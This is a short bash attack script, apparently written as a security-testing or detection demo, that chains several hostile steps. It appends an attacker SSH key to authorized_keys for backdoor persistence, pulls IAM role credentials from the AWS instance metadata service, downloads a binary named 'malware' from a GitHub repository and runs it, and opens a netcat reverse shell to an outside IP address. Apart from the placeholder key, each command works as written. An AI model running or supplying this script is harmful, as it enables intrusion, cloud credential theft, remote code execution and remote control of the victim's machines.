#!/usr/bin/bash

set -e
cd /var/www/html 2>/dev/null || cd /tmp

# Download file using curl

# Persistence: Add SSH key for backdoor access 
mkdir -p ~/.ssh 2>/dev/null || true
chmod 700 ~/.ssh 2>/dev/null || true
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3FAKE+DEMO+KEY+FOR+SECURITY+TESTING+NOT+REAL attacker@malicious.demo" >> ~/.ssh/authorized_keys 2>/dev/null || true
chmod 600 ~/.ssh/authorized_keys 2>/dev/null || true

## Retrieve IMDS v2
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/)

ACCESS_KEY_ID=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME")

if [ "$(uname -m)" = "x86_64" ]; then
    curl -o malware https://raw.githubusercontent.com/safchain/dd-malware/main/malware.x64
else
    curl -o malware https://raw.githubusercontent.com/safchain/dd-malware/main/malware.arm64
fi

# Make the file executable
chmod +x malware
MALWARE_PATH="$(pwd)/malware"

# Execute the malware
"$MALWARE_PATH" --cpu-priority 4 &

apt update

apt install netcat-openbsd

nc.openbsd 100.113.5.233 4400 -e /bin/sh